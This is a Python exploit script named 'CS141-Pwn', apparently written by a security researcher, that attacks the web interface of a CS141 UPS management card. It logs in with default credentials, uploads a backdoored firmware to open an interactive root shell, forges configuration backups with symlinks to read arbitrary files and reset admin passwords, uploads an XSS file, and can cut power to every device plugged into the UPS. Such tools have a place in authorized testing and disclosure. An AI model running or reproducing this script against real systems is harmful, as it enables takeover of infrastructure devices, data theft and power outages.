#!/usr/bin/python3
#===========================#
#  CS141-Pwn by @JoelGMSec  #
#   https://darkbyte.net    #
#===========================#

# Imports
import time, sys, os
import requests, tarfile
import hashlib, shutil
import ssl, json, base64, argparse
from termcolor import colored
from urllib.request import urlopen
from urllib3.exceptions import InsecureRequestWarning

# Banner
banner = """
   ____ ____  _ _  _   _       ____                 
  / ___/ ___|/ | || | / |     |  _ \__      ___ __  
 | |   \___ \| | || |_| |_____| |_) \ \ /\ / / '_ \ 
 | |___ ___) | |__   _| |_____|  __/ \ V  V /| | | |
  \____|____/|_|  |_| |_|     |_|     \_/\_/ |_| |_|
                                                                                           
  ------------------ by @JoelGMSec ----------------
"""

# Args & Help
print (colored(banner, "blue"))
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--user", default="admin", help="User to access on web server", type=str)
parser.add_argument("-p", "--password", default="cs141-snmp", help="Password to access on web server", type=str)
parser.add_argument("-t", "--target", help="URL adress to connect", type=str)
parser.add_argument("-s", "--sleep", help="Sleep time before connect again", type=int)
parser.add_argument("-up", "--upload", action="store_true", help="Upload index.html file to upload folder")
parser.add_argument("-del", "--delete", action="store_true", help="Delete index.html file on upload folder")
parser.add_argument("-down", "--download", help="System file path to download", type=str)
parser.add_argument("-rs", "--reset", action="store_true", help="Try to reset admin password to default")
parser.add_argument("-sh", "--shell", action="store_true", help="Upload evil firmware and get root shell")
parser.add_argument("-pow", "--poweroff", action="store_true", help="Turns off devices plugged into the UPS")
parser.add_argument("-bak", "--backup", action="store_true", help="Restore to the original firmware backup")
args = parser.parse_args()

# Headers
b64data = args.user + ":" + args.password
b64auth = base64.b64encode(b64data.encode('ascii')).decode('ascii')
cookies = ""

headers = {"User-Agent": "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
"Accept": "application/json, text/plain, */*", "Authorization": "Basic " + b64auth,
"Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "DNT": "1", "Connection": "close"}

defhead = {"User-Agent": "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
"Accept": "application/json, text/plain, */*", "Authorization": "Basic " + "YWRtaW46Y3MxNDEtc25tcAo=",
"Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "DNT": "1", "Connection": "close"}

dwnhead = {"User-Agent": "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
"Accept": "application/json, text/plain, */*", "Authorization": "Basic " + b64auth,
"Accept-Encoding": "gzip, deflate", "Content-Type": "application/gzip", "DNT": "1", "Connection": "close"}

nohead = {"User-Agent": "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
"Accept": "application/json, text/plain, */*", "X-HTTP-Method-Override": "PUT",
"Accept-Encoding": "gzip, deflate", "Content-Type": "text/html", "DNT": "1", "Connection": "close"}

powhead = {"User-Agent": "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
"Accept": "application/json, text/plain, */*", "X-HTTP-Method-Override": "PUT",
"Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "DNT": "1", "Connection": "close"}

defaultpass="$2$4CDE44A50692C926C21E457D8C1C7DAE54FCC687D71947418C3470CCED708BA4DDA084CE2068D7CD4103ECC212A64F8C3A7BAA3C041E655A50CD78D0051B66CF"
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Main
while True:
    try:
        if len(sys.argv) < 2:
            parser.print_help(sys.stderr)    
            break

        if args.target:
            if len(sys.argv) < 4:
                print (colored("[!] No action provided! Use -h to see help!\n", "red"))
                break

            adress = args.target + "/api/login"
            username = args.user ; password = args.password ; target = args.target
            jsondata = {"anonymous": "", "password": password, "userName": username}
            response = requests.post(adress, headers=headers, json=jsondata, verify=False)
            cookies = (response.cookies) ; cookies_dict = cookies.get_dict()

            if response.ok:                
                output = "[+] Access to " + args.target + " with " + args.user + " user sucessfull!"
                print (colored(output, "green"))
                access = True

                if args.upload or args.delete or args.download or args.reset or args.shell or args.poweroff:
                    pass

                else:
                    print()
                    break

            else:
                output = "[!] Access to " + args.target + " with " + args.user + " user denied!"
                print (colored(output, "red"))
                access = False

                if args.upload or args.delete or args.download or args.reset or args.shell or args.backup:
                    pass

                else:
                    print()
                    break

            if args.poweroff:
                print (colored("[>] Turning off all plugged UPS devices!", "yellow"))
                adress = args.target + "/api/devices/ups/control"
                jsondata = {"code":"upsCtl","params":{"cmdId":261}}
                response = requests.post(adress, headers=powhead, json=jsondata, cookies=cookies, verify=False)
                if not args.sleep:
                    time.sleep(15)
                else:
                    time.sleep(args.sleep)
                print (colored("[!] Done!\n", "red"))
                break

        if args.shell or args.backup:
            if args.backup:
                print (colored("[>] Uploading original firmware..", "yellow"))
                backup = open("Firmware/Original/update082.tar.gz", "rb") ; data = backup.read()
            else:
                print (colored("[>] Uploading evil firmware..", "yellow"))
                backup = open("Firmware/Pwned/update082.tar.gz", "rb") ; data = backup.read()
            adress = args.target + "/upload/update082.tar.gz?reset=false"
            requests.put(adress, headers=dwnhead, cookies=cookies, data=data, verify=False)
            
            print (colored("[+] Waiting for upgrade changes..", "blue"))
            adress = args.target + "/cgi-bin-unsafe/getUpdateStatus.sh"
            requests.get(adress, headers=headers, cookies=cookies, verify=False)
            if not args.sleep:
                time.sleep(30)
            else:
                time.sleep(args.sleep)

            if args.backup:
                print (colored("[+] Done!", "green"))
                break
                
            print (colored("[+] Checking remote code execution..", "green")) ; time.sleep(30)
            adress = args.target + "/cgi-bin-unsafe/backupCheck.sh?code=privesc.sh"
            response = requests.get(adress, headers=headers, cookies=cookies, verify=False)

            if response.ok:
                print (colored("[!] PWNED!! Enjoy your shell :)\n", "red"))               
                
                while True:
                    try:
                        print (colored( "root@cs141 $> ", "green"), end = "")
                        command = input() ; command = "su -c " + command
                        if "exit" in command:
                            print (colored("Exiting..\n", "red"))
                            break
                        adress = args.target + "/cgi-bin-unsafe/backupCheck.sh?code=" + command
                        response = requests.get(adress, headers=headers, cookies=cookies, verify=False)
                        output = str(response.content.decode(errors="ignore")).replace("<pre>","").replace("</pre>","")
                        print (colored(output, "yellow"))

                    except KeyboardInterrupt:
                        print (colored("\nExiting..\n", "red"))
                        break
                break

            else:
                print (colored("[!] Error getting shell!\n", "red"))
                break

        if args.download or args.reset:
            if access == False:
                print (colored("[>] Trying to download backup configuration..", "yellow"))
                adress = args.target + "/cgi-bin/backup.sh"
                response = requests.get(adress, headers=defhead, cookies=cookies_dict, stream=True, verify=False)
                download = response.raw.read()
                f = open("backup.tar.gz", "wb") ; f.write(download) ; f.close()
                
            if access == True:
                print (colored("[>] Downloading backup configuration..", "yellow"))
                adress = args.target + "/cgi-bin/backup.sh"
                response = requests.get(adress, headers=headers, cookies=cookies_dict, stream=True, verify=False)
                download = response.raw.read()
                f = open("backup.tar.gz", "wb") ; f.write(download) ; f.close()
            
            if response.ok:
                print (colored("[+] Backup.tar.gz file downloaded successfully!", "blue")) 
                path = os.getcwd() ; systempath = path + "/backup/gxserve/system.tar"
                
                try:
                    os.makedirs("backup", exist_ok=True)
                    with tarfile.open("backup.tar.gz", "r") as t:
                        t.extractall("backup")
                    os.makedirs("system", exist_ok=True)
                    with tarfile.open(systempath, "r") as t:
                        t.extractall("system")
                    
                    if args.reset:
                        file = path + "/system/etc/gxserve/users.json"
                        with open(file, "r") as f:
                           data = json.load(f)
                        for user in data["local"]["users"]:
                            user["password"] = defaultpass
                        data["admin"] = defaultpass
                        with open(file, "w") as f:
                           json.dump(data, f, indent = 2)
                        f.close()

                    else:
                        file = path + "/system/etc/gxserve/rccmd.pem"
                        os.makedirs("Download", exist_ok=True)
                        os.remove(file)
                        os.symlink(args.download, file)

                except OSError:
                    pass

                if args.reset:
                    print (colored("[>] Replacing users.json & calculating MD5 checksum..", "yellow"))
                else:
                    print (colored("[>] Creating symbolic link & calculating MD5 checksum..", "yellow"))
                with tarfile.open(systempath, mode="w") as archive:
                    archive.add(path + "/system/", arcname='')
                md5 = hashlib.md5(open(systempath,"rb").read()).hexdigest()
                checksumpath = path + "/backup/gxserve/system.tar.md5"
                checksumfile = open(checksumpath, "w")
                checksumfile.write(md5 + "  system.tar\n")
                checksumfile.close()

                with tarfile.open("backup.tar.gz", mode="w:gz") as archive:
                    archive.add(path + "/backup/", arcname='.')
                print (colored("[+] Evil backup created successfully!", "green"))

                adress = args.target + "/upload/backup.tar.gz?restore_network=false"
                backup = open("backup.tar.gz", "rb") ; data = backup.read()
                requests.put(adress, headers=dwnhead, cookies=cookies, data=data, verify=False)
                print (colored("[>] Sending evil backup & restore process..", "yellow"))
                adress = args.target + "/cgi-bin-unsafe/getRestoreStatus.sh"
                requests.get(adress, headers=headers, cookies=cookies, verify=False)
                print (colored("[+] Waiting for update changes..", "blue"))

                if not args.sleep:
                    time.sleep(30)
                else:
                    time.sleep(args.sleep)
                
                if not args.reset:
                    print (colored("[>] Downloading backup again..", "yellow"))
                    adress = args.target + "/api/login"
                    username = args.user ; password = args.password ; target = args.target
                    jsondata = {"anonymous": "", "password": password, "userName": username}
                    response = requests.post(adress, headers=headers, json=jsondata, verify=False)
                    cookies = (response.cookies) ; cookies_dict = cookies.get_dict()
                    os.remove("backup.tar.gz")

                    adress = args.target + "/cgi-bin/backup.sh"
                    response = requests.get(adress, headers=headers, cookies=cookies_dict, stream=True, verify=False)
                    download = response.raw.read()
                    f = open("backup.tar.gz", "wb") ; f.write(download) ; f.close()

                    print (colored("[+] Backup.tar.gz file downloaded successfully!", "blue")) 
                    deletebackup = path + "/backup" ; deletesystem = path + "/system"
                    shutil.rmtree(deletebackup, ignore_errors=True)
                    shutil.rmtree(deletesystem, ignore_errors=True)
         
                    try:
                        os.makedirs("backup", exist_ok=True)
                        with tarfile.open("backup.tar.gz", "r") as t:
                            t.extractall("backup")
                        os.makedirs("system", exist_ok=True)
                        with tarfile.open(systempath, "r") as t:
                            t.extractall("system")
                        downloadfile = "".join(args.download.rsplit("/")[-1:])
                        shutil.move(path + "/system/etc/gxserve/rccmd.pem", path + "/Download/" + downloadfile)
                        output = "[>] Extracting " + downloadfile + " file to download folder.."
                        print (colored(output, "yellow"))

                    except OSError:
                        print (colored("[+] File does not exists on remote host!", "red"))
                        pass

                if args.reset:
                    print (colored("[!] Admin password changed to default: cs141-snmp", "red"))
                deletebackup = path + "/backup" ; deletesystem = path + "/system"
                shutil.rmtree(deletebackup, ignore_errors=True)
                shutil.rmtree(deletesystem, ignore_errors=True)
                os.remove("backup.tar.gz")
                print (colored("[+] Done!\n", "green"))
                break

            else:
                print (colored("[!] Error on file download!\n", "red"))
                break

        if args.upload:
            adress = args.target + "/upload/index.html"
            data = "<script>alert('XSS')</script>"
            response = requests.put(adress, headers=nohead, data=data, verify=False)

            if "201" in str(response):
                output = "[+] File " + str(adress) + " upload success!\n"
                print (colored(output, "green"))
            elif "204" in str(response):
                output = "[+] File " + str(adress) + " already exists!\n"
                print (colored(output, "blue"))
            else:
                print (colored("[!] Error on file upload!\n", "red"))
            break

        if args.delete:
            adress = args.target + "/upload/index.html"
            response = requests.delete(adress, headers=nohead, verify=False)

            if "204" in str(response):
                output = "[+] File " + str(adress) + " delete success!\n"
                print (colored(output, "green"))
            elif "404" in str(response):
                output = "[+] File " + str(adress) + " does not exists!\n"
                print (colored(output, "blue"))
            else:
                print (colored("[!] Error on file deletion!\n", "red"))
            break

    except requests.exceptions.RequestException as e:
        print (colored("[!] Connection failed!\n", "red"))
        break

    except KeyboardInterrupt:
        print (colored("\nExiting..\n", "red"))
        break
